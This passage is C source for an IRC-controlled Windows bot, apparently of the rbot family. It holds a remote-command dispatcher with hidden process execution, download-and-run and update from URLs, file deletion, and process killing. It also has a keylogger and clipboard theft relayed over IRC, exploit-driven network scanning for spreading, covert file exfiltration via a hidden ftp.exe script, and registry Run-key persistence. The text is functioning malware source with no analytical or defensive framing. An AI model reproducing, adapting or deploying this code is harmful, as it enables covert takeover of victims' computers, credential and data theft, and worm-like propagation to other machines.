				irc_privmsg(sock, a[2], GetClipboardText(), notice);
				// // // // // // // // // // // // // // // // addlog("[MAIN]: Get Clipboard.");

				return repeat;
			}


			////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			#ifndef NO_ADVSCAN
			else if (strcmp("fuckoff", a[s]) == 0 || strcmp("sa", a[s]) == 0) {
				for(int i=0; scanall[i].isend != false; i++) { }
				for(int sne=0; scanall[sne].isend != false; sne++) {
					int scanthreads=findthreadid(SCAN_THREAD);
					if (scanthreads + 400/i > MAXSCANTHRD) {
						sprintf(sendbuf ,"[SCAN]: Already %d scanning threads. Too many specified.", scanthreads);
						irc_privmsg(sock,a[2],sendbuf,notice);
					} else {
						ADVSCAN advscan;
						//advscan.port = atoi(a[s+1]); // check for method or port number
						advscan.threads = 25;
						advscan.delay = 5;
						advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
						advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
						advscan.minutes = 0;
						advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
						advscan.exploit = -1;

						for(i=0;exploit[i].port != 0;i++) {
							if (strcmp(exploit[i].command, scanall[sne].command) == 0) {
								advscan.port = exploit[i].port;
								advscan.exploit = i;

								break;
							}
						}

						if (advscan.port == 0) {
							sprintf(sendbuf, "[SCAN]: Failed to start scan, port is invalid.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							// // // // // // // // // // // // // // // // addlog(sendbuf);

							return 1;
						}
						SOCKADDR_IN ssin;
						int ssin_len=sizeof(ssin);
						fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
						ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
						strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

						int extractip = ((parameters['a']) ? 3 : 2);
						for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);		
						advscan.random = TRUE;
						advscan.sock = sock;
						advscan.notice = notice;
						advscan.silent = silent;
						_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
						if (strcmp(exploitchan,"") != 0)
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
						else
							advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "[SCAN]: %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", 
							((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
						if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
							while(advscan.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"[SCAN]: Failed to start scan thread, error: <%d>.", GetLastError());

						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						// // // // // // // // // // // // // // // // addlog(sendbuf);

					}
				}
				return 1;
			}

			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendv(sock, "NICK %s\r\n", a[s+1]);
				//addlogv("[MAIN]: Nick changed to: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				//addlogv("[MAIN]: Joined channel: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				//addlogv("[MAIN]: Parted channel: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "%s\r\n", y);
						//addlogv("[MAIN]: IRC Raw: %s.",y);
					}
				}

				return repeat;
			}
			else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"[THREADS]: Stopped: %d thread(s).", i);
					else
						sprintf(sendbuf,"[THREADS]: No active threads found.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					// // // // // // // // // // // // // // // // addlog(sendbuf);					
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;
					
						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"[THREADS]: Killed thread: %s.",a[i]);
						else 
							sprintf(sendbuf,"[THREADS]: Failed to kill thread: %s.",a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						// // // // // // // // // // // // // // // // addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp("c_quit", a[s]) == 0 || strcmp("c_q", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					irc_sendv(threads[atoi(a[s+1])].sock, "QUIT :later\r\n");
					Sleep(500);
					fclosesocket(threads[atoi(a[s+1])].sock);
					TerminateThread(threads[atoi(a[s+1])].tHandle, id);
					threads[atoi(a[s+1])].tHandle = 0;
					threads[atoi(a[s+1])].name[0] = '\0';
				}

				return 1;
			}
///////////////////////////////////////////////////////////////////////////////
			else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) {
				prefix = a[s+1][0];
				sprintf(sendbuf,"[MAIN]: Prefix changed to: '%c'.",a[s+1][0]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return 1;
			}
			else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				if (fShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW))
					sprintf(sendbuf,"[SHELL]: File opened: %s", a[s+1]);
				else
					sprintf(sendbuf,"[SHELL]: Couldn't open file: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
				sprintf(sendbuf,"[MAIN]: Server changed to: '%s'.",a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return 1;
			}
			else if (strcmp("dns", a[s]) == 0 || strcmp("dn", a[s]) == 0) {
				LPHOSTENT hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = finet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL)
						sprintf(sendbuf, "[DNS]: Lookup: %s -> %s.", a[s+1], hostent->h_name);
				}
				else {
					hostent = fgethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "[DNS]: Lookup: %s -> %s.", a[s+1], finet_ntoa(iaddr));
					}
				}
				if (hostent == NULL)
					sprintf(sendbuf,"[DNS]: Couldn't resolve hostname.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return repeat;
			}

			#ifndef NO_PROCESS
			else if (strcmp("killproc",a[s]) == 0 || strcmp("kp", a[s]) == 0) {  // kill process name
				if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
					sprintf(sendbuf,"[PROC]: Process killed: %s",a[s+1]);
				else
					sprintf(sendbuf,"[PROC]: Failed to terminate process: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("kill",a[s]) == 0 || strcmp("ki", a[s]) == 0) {  // kill process id
				if(killProcess(atoi(a[s+1])) == 1)
					sprintf(sendbuf,"[PROC]: Process killed ID: %s",a[s+1]);
				else
					sprintf(sendbuf,"[PROC]: Failed to terminate process ID: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp("delete", a[s]) == 0 || strcmp("del", a[s]) == 0) { 
				if (DeleteFile(a[s+1])) 
					_snprintf(sendbuf,sizeof(sendbuf),"[FILE]: Deleted '%s'.",a[s+1]);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FILE]:"));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return repeat;
			}

			else if (strcmp("list", a[s]) == 0 || strcmp("li", a[s]) == 0) { 
//				GetFiles(a[s+1],sock,a[2],NULL);
				//addlogv("[FILE]: List: %s", a[s+1]);

				return repeat;
		}
			else if (strcmp("mirccmd", a[s]) == 0 || strcmp("mirc", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) {
						if (!mirccmd(y))
							sprintf(sendbuf,"[mIRC]: Client not open.");
						else
							sprintf(sendbuf,"[mIRC]: Command sent.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						// // // // // // // // // // // // // // // // addlog(sendbuf);
					}
                }

				return repeat;
			}
		

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			#ifndef NO_IDENT
			else if (strcmp("ident", a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0) {
					if (findthreadid(IDENT_THREAD) > 0)
						sprintf(sendbuf ,"[IDENT]: Already running.");
					else {
						sprintf(sendbuf,"[IDENTD]: Server running on Port: 113.");
						i = addthread(sendbuf,IDENT_THREAD,NULL);
						if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
							sprintf(sendbuf,"[IDENTD]: Failed to start server, error: <%d>.", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(IDENT_THREAD)) > 0)
						sprintf(sendbuf,"[IDENT]: Server stopped. (%d thread(s) stopped.)",i);
					else
						sprintf(sendbuf,"[IDENT]: No thread found.");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_KEYLOG
			else if (strcmp("keylog", a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0 || strcmp("file", a[s+1]) == 0) {
					if (findthreadid(KEYLOG_THREAD) > 0)
						sprintf(sendbuf ,"[KEYLOG]: Already running.");
					else {
						KEYLOG keylog;
						keylog.sock = sock;
						keylog.notice = notice;
						keylog.silent = ((strcmp("file", a[s+1]) == 0)?(TRUE):(silent));
						_snprintf(keylog.chan, sizeof(keylog.chan), ((a[s+2])?(a[s+2]):((strcmp(keylogchan,"")==0)?(a[2]):(keylogchan))));

						sprintf(sendbuf, "[KEYLOG]: Key logger active.");
						keylog.threadnum = addthread(sendbuf, KEYLOG_THREAD, NULL);
						if (threads[keylog.threadnum].tHandle = CreateThread(NULL, 0, &KeyLoggerThread, (LPVOID)&keylog, 0, &id)) {
							while(keylog.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"[KEYLOG]: Failed to start logging thread, error: <%d>.", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(KEYLOG_THREAD)) > 0)
						sprintf(sendbuf,"[KEYLOG]: Key logger stopped. (%d thread(s) stopped.)",i);
					else
						sprintf(sendbuf,"[KEYLOG]: No key logger thread found.");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return 1;
			}
			#endif
		
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			else if (strcmp("gethost", a[s]) == 0 || strcmp("gh", a[s]) == 0) { 
				if(strstr(host, a[s+1])) {
					if (a[s+2]) {
						char *y = strstr(x, a[s+2]);
						if (y != NULL) {
							sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], y);
							strncpy(line,  sendbuf, (IRCLINE-1));
							sprintf(sendbuf,"[MAIN]: Gethost: %s, Command: %s", a[s+1],y);
							repeat++;
						} else
							sprintf(sendbuf,"[MAIN]: Unable to extract Gethost command.");							
					} else {
						irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
						_snprintf(sendbuf,sizeof(sendbuf),"[MAIN]: Gethost: %s.",a[s+1]);
					}
					// // // // // // // // // // // // // // // // addlog(sendbuf);
				}

				return repeat;
			}

			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
		
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						irc_privmsg(sock, a[s+1], y, FALSE);
						//addlogv("[MAIN]: Privmsg: %s: %s.",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
						//addlogv("[MAIN]: Action: %s: %s.",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) 
					return 1;
				irc_sendv(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
				// // // // // // // // // // // // // // // // addlog("[MAIN]: Cycle.");

				return repeat;
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "MODE %s\r\n", y);
						//addlogv("[MAIN]: Mode change: %s",y);
					}
				}

				return repeat;
			}
		/////////////////////////////////////////////////////////////////////////
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					if (strcmp(a[s+2]+1,"repeat") != 0) {
						sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
						strncpy(line,  sendbuf, (IRCLINE-1));
						sprintf(sendbuf,"[MAIN]: Repeat: %s", r);
						// // // // // // // // // // // // // // // // addlog(sendbuf);

						if (atoi(a[s+1]) > 0) 
							return repeat + atoi(a[s+1]); 
						else 
							return repeat;
					} else {
						sprintf(sendbuf,"[MAIN]: Repeat not allowed in command line: %s", r);
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						// // // // // // // // // // // // // // // // addlog(sendbuf);
					}
				}

				return repeat;
			}
			else if (strcmp("delay", a[s]) == 0 || strcmp("de", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) 
						Sleep(atoi(a[s+1])*1000);
					// // // // // // // // // // // // // // // // addlog("[MAIN]: Delay.");
					return repeat + 1;
				}

				return 1;
			}
			#ifndef NO_DOWNLOAD
			else if ((strcmp("update", a[s]) == 0) || (strcmp("up", a[s]) == 0)) {
				if (strcmp(botid, a[s+2]) != 0) {
					char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
					GetTempPath(sizeof(tempdir), tempdir);

					DOWNLOAD dl;
					strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
					sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
					dl.update = 1;
					dl.run = 0;
					dl.expectedcrc=((a[s+3])?(strtoul(a[s+3],0,16)):(0));
					dl.filelen=((a[s+4])?(atoi(a[s+4])):(0));
					dl.encrypted=(parameters['e']);

					dl.sock = sock;
					strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
					dl.notice=notice;
					dl.silent = silent;

					sprintf(sendbuf, "[UPDATE]: Downloading update from: %s.", a[s+1]);
					dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
					if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
						while(dl.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[UPDATE]: Failed to start download thread, error: <%d>.", GetLastError());
				} else
					sprintf(sendbuf,"[UPDATE]: Bot ID must be different than current running process.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return repeat;
			}
			#endif
			// FIX ME: Add execute with output, rip from my IROFFER
			else if (strcmp("execute", a[s]) == 0 || strcmp("e", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow=SW_HIDE;
				if (atoi(a[s+1]) == 1) sinfo.wShowWindow=SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) 
						if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo))
							sprintf(sendbuf,"[EXEC]: Couldn't execute file.");
						else
							sprintf(sendbuf,"[EXEC]: Commands: %s",y);
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return repeat;
			}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			else if (strcmp("rename", a[s]) == 0 || strcmp("mv", a[s]) == 0) {
				if (MoveFile(a[s+1],a[s+2]))
					_snprintf(sendbuf,sizeof(sendbuf),"[FILE]: Rename: '%s' to: '%s'.", a[s+1], a[s+2]);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FILE]:"));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return 1;
			}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			else if (strcmp("clone", a[s]) == 0 || strcmp("c", a[s]) == 0) {
				IRC irc;
				strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
				irc.port = atoi(a[s+2]);
				strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
				if (a[s+4]) 
					strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
				irc.spy = 1;

				sprintf(sendbuf, "[CLONES]: Created on %s:%d, in channel %s.", irc.host, irc.port, irc.channel);
				irc.threadnum = addthread(sendbuf, CLONE_THREAD, NULL);
				if (threads[irc.threadnum].tHandle = CreateThread(NULL, 0, &irc_connect, (LPVOID)&irc, 0, &id)) {
					while(irc.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[CLONES]: Failed to start clone thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return repeat;
			}
			////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			#ifndef NO_DOWNLOAD
			else if (strcmp("download", a[s]) == 0 || strcmp("dl", a[s]) == 0) {
				DOWNLOAD dl;
				strncpy(dl.url, a[s+1], sizeof(dl.url)-1);
				strncpy(dl.dest, a[s+2], sizeof(dl.dest)-1);
				dl.update = 0;
				dl.run = ((a[s+3])?(atoi(a[s+3])):(0));
				dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
				dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
				dl.encrypted=(parameters['e']);

				dl.sock = sock;
				strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
				dl.notice=notice;
				dl.silent = silent;

				sprintf(sendbuf, "[DOWNLOAD]: Downloading URL: %s to: %s.", a[s+1], a[s+2]);
				dl.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
					while(dl.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[DOWNLOAD]: Failed to start transfer thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);
				
				return 1;
			}
			#endif
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
			else if (strcmp("c_privmsg", a[s]) == 0 || strcmp("c_pm", a[s]) == 0) {
				if (threads[atoi(a[s+1])].nick[0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_privmsg(threads[atoi(a[s+1])].sock, a[s+2], y, FALSE);
						if (threads[atoi(a[s+1])].name[0] == 's') {
							sprintf(sendbuf, "[%s] <%s> %s", a[s+2], threads[atoi(a[s+1])].nick, y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}

				return repeat;
			}
			else if (strcmp("c_action", a[s]) == 0 || strcmp("c_a", a[s]) == 0) {
				if (threads[atoi(a[s+1])].nick[0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_privmsg(threads[atoi(a[s+1])].sock, a[s+2], sendbuf, FALSE);
						if (threads[atoi(a[s+1])].name[0] == 's') {
							sprintf(sendbuf, "[%s] * %s %s", a[s+2], threads[atoi(a[s+1])].nick, y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}

				return repeat;
			}

			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_ADVSCAN
			else if (strcmp("abuse", a[s]) == 0 || strcmp("asc", a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"[SCAN]: Already %d scanning threads. Too many specified.", scanthreads);
					irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); // check for method or port number
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
					advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;

							break;
						}
					}

					if (advscan.port == 0) {
						sprintf(sendbuf, "[SCAN]: Failed to start scan, port is invalid.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						// // // // // // // // // // // // // // // // addlog(sendbuf);

						return 1;
					}

					if (a[s+5] && a[s+5][0] != '#') {
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					} else {
						if (parameters['a'] || parameters['b'] || parameters['r']) {
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
								advscan.random = TRUE;
							} else
								advscan.random = FALSE;
						} else {
							sprintf(sendbuf, "[SCAN]: Failed to start scan, no IP specified.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							// // // // // // // // // // // // // // // // addlog(sendbuf);
							
							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					if (a[s+6])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					else if (a[s+5] && a[s+5][0] == '#')
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					else if (strcmp(exploitchan,"") != 0)
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					else
						advscan.msgchan[0] = '\0';

					sprintf(sendbuf, "[SCAN]: %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", 
						((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
					advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						while(advscan.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[SCAN]: Failed to start scan thread, error: <%d>.", GetLastError());

					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					// // // // // // // // // // // // // // // // addlog(sendbuf);

					return 1;
				}
			}
			#endif
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



			// commands requiring at least 5 parameters 
		    else if (a[s+5] == NULL) return 1; 
			else if (strcmp("upload",a[s]) == 0) { 
				if (!FileExists(a[s+5])) { 
					sprintf(sendbuf,"[FTP]: File not found: %s.", a[s+5]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					// // // // // // // // // // // // // // // // addlog(sendbuf);
					return 1; 
				} 
				char tmpftp[MAX_PATH],tmpsys[MAX_PATH]; 

				srand(GetTickCount());
				sprintf(tmpftp,"%s\\%i%i%i.dll",tmpsys,rand()%999,rand()%99,rand()%9); 

				FILE * fp = fopen(tmpftp,"ab"); 
				if (fp != NULL) { 
					fprintf(fp, "open %s\r\n%s\r\n%s\r\n%s\r\nput %s\r\nbye\r\n",
						a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]); 
					fclose(fp); 

					char cmdline[256]; 
					sprintf(cmdline,"-s:%s",tmpftp); 
					if (fShellExecute(0, "open", "ftp.exe", cmdline, NULL, SW_HIDE))
						sprintf("[FTP]: Uploading file: %s to: %s",a[s+5],a[s+1]);
					else
						sprintf("[FTP]: Uploading file: %s to: %s failed.",a[s+5],a[s+1]);

					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice); 
					// // // // // // // // // // // // // // // // addlog(sendbuf);
		
					while (FileExists(tmpftp)) 
						remove(tmpftp); 
				}

				return 1;
			}
		}
	}

	return repeat;
}
#endif


// globals
extern char tempdir[256];      // name of temp folder 


// globals
#ifndef NO_REGISTRY
int registry_delay=120;
#endif

AUTOSTART autostart[]={
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey1},
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey2},
	{HKEY_CURRENT_USER,(LPCTSTR)regkey3}
};

void AutoStartRegs(char *nfilename)
{
	HKEY key;

	for (int i=0; i < (sizeof(autostart) / sizeof(AUTOSTART)); i++) {
		fRegCreateKeyEx(autostart[i].hkey, autostart[i].subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		if (nfilename)
			fRegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)nfilename, strlen(nfilename));
		else
			fRegDeleteValue(key, valuename); 
		fRegCloseKey(key); 
	}
   
	return;
}

#ifndef NO_REGISTRY
DWORD WINAPI AutoRegistry(LPVOID param)
{
